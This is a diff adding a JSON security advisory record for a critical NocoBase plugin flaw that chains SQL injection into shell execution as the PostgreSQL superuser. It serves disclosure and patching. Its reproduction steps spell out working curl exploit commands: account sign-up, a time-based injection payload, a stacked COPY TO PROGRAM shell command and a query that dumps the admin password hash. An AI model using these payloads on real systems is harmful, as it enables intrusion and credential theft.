@@ -1,0 +1,62 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-07-31T19:45:02Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "@nocobase/plugin-notification-in-app-message"
+  },
+  "Advisory": {
+    "DatabaseId": 397241,
+    "Id": "GSA_kwCzR0hTQS1wODQ5LThod2gtODRqOc4ABg-5",
+    "GhsaId": "GHSA-p849-8hwh-84j9",
+    "References": [
+      {
+        "Url": "https://github.com/nocobase/nocobase/security/advisories/GHSA-p849-8hwh-84j9"
+      },
+      {
+        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2026-52887"
+      },
+      {
+        "Url": "https://github.com/nocobase/nocobase/pull/9630"
+      },
+      {
+        "Url": "https://github.com/nocobase/nocobase/commit/68d64e3fcfb8be2ae4f3bfc9e1ee3f85b87c89ce"
+      },
+      {
+        "Url": "https://github.com/nocobase/nocobase/releases/tag/v2.0.61"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-p849-8hwh-84j9"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-p849-8hwh-84j9"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-52887"
+      }
+    ],
+    "Description": "## Summary\n\n`GET /api/myInAppChannels:list` accepts a structured `filter` query parameter. The handler for the `latestMsgReceiveTimestamp` field splices the `$lt` value directly into a `Sequelize.literal()` template string with no escape, type cast, or parameter binding. The action ACL is `loggedIn`, so any authenticated account reaches it. The default `auth-basic` authenticator ships `allowSignUp: true`, so the account is obtainable anonymously.\n\nThe injection is reachable with the URL parameter `filter[latestMsgReceiveTimestamp][$lt]=\u003cexpression\u003e`. The `pg` driver in front of Sequelize accepts stacked statements, so the chain extends from boolean and timing oracles to multi-statement payloads.\n\nThe shipped `docker-compose.yml` creates the DB role `nocobase` on a stock `postgres:16` image, which assigns the `rolsuper` attribute by default. `COPY ... TO PROGRAM '...'` therefore runs shell commands as `uid=999(postgres)` inside the database container.\n\nResult: any anonymous visitor signs up, signs in, and exfiltrates arbitrary rows or executes shell commands inside the database container with one HTTP GET after the sign-in.\n\n## Affected\n\nNocoBase server, `@nocobase/plugin-notification-in-app-message` `\u003c=2.0.57`. Confirmed live-exploitable on the official `nocobase/nocobase:2.0.57` Docker image (HEAD `e35a2737d9df139cacecae0151c3326746e2339a`).\n\n`@nocobase/plugin-notification-in-app-message` is enabled by default in `@nocobase/preset-nocobase`. The default `auth-basic` ships `allowSignUp: true`. The shipped `docker/app-postgres/docker-compose.yml` uses `POSTGRES_USER=nocobase` against `postgres:16`, which makes the role a PostgreSQL superuser; `COPY ... TO PROGRAM` runs from this role.\n\n## Root cause\n\n`packages/plugins/@nocobase/plugin-notification-in-app-message/src/server/defineMyInAppChannels.ts:62-63`: the `latestMsgReceiveTimestamp` filter is built as `Sequelize.literal(\\`${latestMsgReceiveTimestampSQL} \u003c ${filter.latestMsgReceiveTimestamp.$lt}\\`)`. The `$lt` value comes straight from the GET `filter` JSON; the template uses `${...}` interpolation with no `escape()`, `replacements`, or type cast.\n\n`packages/plugins/@nocobase/plugin-notification-in-app-message/src/server/InAppNotificationChannel.ts:200`: `app.acl.allow('myInAppChannels', '*', 'loggedIn')` exposes every action on the resource to every authenticated role, including the seeded `member`.\n\n`packages/plugins/@nocobase/plugin-auth/src/server/plugin.ts:295`: `allowSignUp: true` ships in the default `auth-basic` seed; `POST /api/auth:signUp` returns 200 with no admin involvement.\n\n`docker/app-postgres/docker-compose.yml:30`: `POSTGRES_USER: nocobase` against `postgres:16`. The bare `postgres:16` image creates the named role with `rolsuper=true` (live-verified: `SELECT rolsuper FROM pg_roles WHERE rolname='nocobase'` returns `true`). The `pg` driver simple-query accepts stacked statements.\n\n## Reproduction\n\nTested against `nocobase/nocobase:2.0.57` from the official Docker image with the default `app-postgres` compose. Attacker is an anonymously-signed-up `member`.\n\n1. Anonymous sign-up, then sign-in for a `member` JWT.\n\n```\ncurl -X POST -H 'Content-Type: application/json' \\\n  -d '{\"username\":\"a\",\"password\":\"P!ssw0rd1\",\"confirm_password\":\"P!ssw0rd1\"}' \\\n  http://target:13000/api/auth:signUp?authenticator=basic\nTOKEN=$(curl -sX POST -H 'Content-Type: application/json' \\\n  -d '{\"account\":\"a\",\"password\":\"P!ssw0rd1\"}' \\\n  http://target:13000/api/auth:signIn?authenticator=basic | jq -r .data.token)\n```\n\n2. Time-based oracle confirms injection. Each request below takes ~5 seconds.\n\n```\ncurl -sG -H \"Authorization: Bearer $TOKEN\" -H \"X-Authenticator: basic\" \\\n  \"http://target:13000/api/myInAppChannels:list\" \\\n  --data-urlencode \"filter[latestMsgReceiveTimestamp][\\$lt]=0) AND 1882=(SELECT 1882 FROM PG_SLEEP(5))-- a\"\n```\n\n3. Stacked-statement `COPY ... TO PROGRAM` runs shell as `uid=999(postgres)` inside the database container.\n\n```\ncurl -sG -H \"Authorization: Bearer $TOKEN\" -H \"X-Authenticator: basic\" \\\n  \"http://target:13000/api/myInAppChannels:list\" \\\n  --data-urlencode \"filter[latestMsgReceiveTimestamp][\\$lt]=0); COPY (SELECT 1) TO PROGRAM 'id \u003e /tmp/PWN_VERIFY.txt'; --\"\ndocker exec launch-postgres-1 cat /tmp/PWN_VERIFY.txt\n# uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)\n```\n\nLive-verified: sqlmap 1.10.3 against this endpoint reports `Type: boolean-based blind` (payload `0) AND 1511=(SELECT (CASE WHEN (1511=1511) THEN 1511 ELSE (SELECT 4568 UNION SELECT 9477) END))-- KVYH`), `Type: time-based blind`, `current user: nocobase`, `current user is DBA: True`. Admin password hash `ef6ea7f6...8ea12` exfiltrated via `COPY (SELECT email,password FROM users WHERE id=1) TO PROGRAM 'cat \u003e /tmp/PWN_HASH.txt'`. Reproduced 2026-05-26 against HEAD `e35a2737`.\n\n## Impact\n\n- Authenticated SQL injection with time-based, boolean-based, and stacked-statement primitives (`pg` driver simple-query).\n- Arbitrary row read of any collection, including `users.password` PBKDF2 hashes for the super-admin account.\n- Shell command execution as `uid=999(postgres)` inside the PostgreSQL container via `COPY ... TO PROGRAM`.\n- Anonymous reach in default deployments because `auth-basic` ships `allowSignUp: true`.\n\n## Credit\n\nJan Kahmen, [turingpoint](https://turingpoint.de) (jan@turingpoint.de)",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-07-31T19:44:59Z",
+    "Severity": "CRITICAL",
+    "Summary": "NocoBase: SQL injection in /api/myInAppChannels:list filter to PG-superuser RCE",
+    "UpdatedAt": "2026-07-31T19:45:02Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 10,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "2.0.61"
+      },
+      "VulnerableVersionRange": "\u003c= 2.0.60"
+    }
+  ]
+}
